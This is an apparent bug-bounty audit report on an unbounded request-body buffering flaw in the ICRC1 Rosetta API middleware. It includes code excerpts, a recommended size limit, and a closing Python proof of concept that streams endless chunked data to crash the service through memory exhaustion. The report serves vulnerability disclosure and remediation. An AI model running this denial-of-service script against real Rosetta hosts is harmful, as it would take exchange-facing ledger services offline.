Audit Report

## Title
Unbounded Request Body Buffering via `to_bytes(body, usize::MAX)` in `RosettaMetricsMiddleware` Enables Unauthenticated OOM DoS — (`rs/rosetta-api/common/rosetta_core/src/metrics.rs`)

## Summary

`RosettaMetricsMiddleware::call` unconditionally buffers the entire HTTP request body before routing by calling `extract_canister_id`, which invokes `to_bytes(body, usize::MAX)` with no size cap. An unauthenticated attacker can exhaust process heap memory by streaming an arbitrarily large chunked body to any ICRC1 Rosetta POST endpoint, OOM-killing the process and halting all ledger sync and token operations.

## Finding Description

In `rs/rosetta-api/common/rosetta_core/src/metrics.rs`, `extract_canister_id` reads the full body with no upper bound:

```rust
let bytes = to_bytes(body, usize::MAX).await?;
``` [1](#0-0) 

This is called unconditionally from `RosettaMetricsMiddleware::call` for every request that is not `/metrics`:

```rust
let (canister_id, reconstructed_body) = match extract_canister_id(body).await {
    Ok((canister_id, body_bytes)) => (canister_id, Body::from(body_bytes)),
    Err(_) => (None, Body::empty()),
};
``` [2](#0-1) 

The `Err` arm does not prevent the OOM — the OS kills the process during the allocation, before any error can be returned. The ICRC1 Rosetta Axum router applies this middleware with no `RequestBodyLimitLayer` or `DefaultBodyLimit` anywhere in the stack:

```rust
.layer(metrics_layer)
.layer(add_request_span())
.layer(RequestIdLayer)
``` [3](#0-2) 

By contrast, the IC HTTP endpoint stack explicitly guards body size before processing:

```rust
.layer(DefaultBodyLimit::disable())
.layer(RequestBodyLimitLayer::new(config.max_request_size_bytes as usize))
``` [4](#0-3) 

No equivalent guard exists in the ICRC1 Rosetta stack. The `usize::MAX` argument to `to_bytes` is not a pre-allocation — it is the limit check, meaning the buffer grows without bound as chunked data arrives, consuming heap proportional to the actual bytes sent.

## Impact Explanation

This matches the allowed ICP bounty impact: **High ($2,000–$10,000) — Application/platform-level DoS, crash, or subnet availability impact not based on raw volumetric DDoS.** A single TCP connection with a crafted chunked-transfer body (no `Content-Length` required) causes unbounded heap growth in the Rosetta process, triggering an OOM kill. This halts ledger synchronization, all ICRC1 token operations, and the exchange-facing Rosetta API for the affected instance. The Rosetta API is explicitly in-scope as a financial integration component.

## Likelihood Explanation

The Rosetta HTTP port is exchange-facing and typically publicly reachable (`0.0.0.0:<port>`). No credentials, valid JSON, or prior state are required. A single TCP connection using chunked transfer encoding suffices. The attack is immediately repeatable after process restart, making it a persistent availability threat.

## Recommendation

Replace `usize::MAX` with a bounded limit in `extract_canister_id` in `rs/rosetta-api/common/rosetta_core/src/metrics.rs`:

```rust
const MAX_BODY_SIZE: usize = 10 * 1024 * 1024; // 10 MB
let bytes = to_bytes(body, MAX_BODY_SIZE).await
    .map_err(|_| /* return 413 */)?;
```

Alternatively, add `RequestBodyLimitLayer::new(MAX_BODY_SIZE)` to the Axum router in `rs/rosetta-api/icrc1/src/main.rs` before `metrics_layer` is applied, mirroring the pattern in `rs/http_endpoints/public/src/lib.rs`. [5](#0-4) 

## Proof of Concept

```bash
# Stream a large chunked body to any POST endpoint; no Content-Length needed
python3 -c "
import socket, time
s = socket.create_connection(('rosetta-host', 8080))
s.send(b'POST /block HTTP/1.1\r\nHost: rosetta-host\r\nTransfer-Encoding: chunked\r\nContent-Type: application/json\r\n\r\n')
chunk = b'%x\r\n%s\r\n' % (65536, b'A' * 65536)
while True:
    s.send(chunk)
    time.sleep(0.001)
"
# Monitor: watch -n1 'ps aux | grep rosetta'
# Expected: process RSS grows unboundedly → OOM kill → Rosetta service unavailable
```

A deterministic integration test can be written by constructing a `RosettaMetricsMiddleware` in a test harness, sending a request with a body stream that yields a configurable number of bytes, and asserting that the middleware returns an error (or the process is killed) when the body exceeds a reasonable threshold.
